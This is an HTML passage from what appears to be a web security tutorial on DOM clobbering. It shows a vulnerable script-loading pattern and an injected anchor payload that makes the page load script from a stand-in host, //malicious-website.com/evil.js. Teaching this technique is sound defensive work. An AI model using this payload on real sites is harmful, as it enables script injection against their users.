        <h1 class="heading-2">DOM clobbering</h1><p>
            In this section, we will describe what DOM clobbering is, demonstrate how you can exploit DOM vulnerabilities using clobbering techniques, and suggest ways you can reduce your exposure to DOM clobbering attacks.
        </p><h2 id="what-is-dom-clobbering">What is DOM clobbering?</h2><p>
            DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes <code>id</code> or <code>name</code> are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.
        </p><p>
            The term clobbering comes from the fact that you are "clobbering" a global variable or property of an object and overwriting it with a DOM node or HTML collection instead. For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as <code>submit</code>, to interfere with a form's actual <code>submit()</code> function.
        </p><h2 id="how-to-exploit-dom-clobbering-vulnerabilities">How to exploit DOM-clobbering vulnerabilities</h2><p>
            A common pattern used by JavaScript developers is:
        </p><code class="code-scrollable">var someObject = window.someObject || {};</code><p>
            If you can control some of the HTML on the page, you can clobber the <code>someObject</code> reference with a DOM node, such as an anchor. Consider the following code:
        </p><code class="code-scrollable">&lt;script&gt;
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
&lt;/script&gt;</code><p>
            To exploit this vulnerable code, you could inject the following HTML to clobber the <code>someObject</code> reference with an anchor element:
        </p><code class="code-scrollable">&lt;a id=someObject&gt;&lt;a id=someObject name=url href=//malicious-website.com/evil.js&gt;</code><p>
            As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the <code>someObject</code> reference with this DOM collection. A <code>name</code> attribute is used on the last anchor element in order to clobber the <code>url</code> property of the <code>someObject</code> object, which points to an external script.
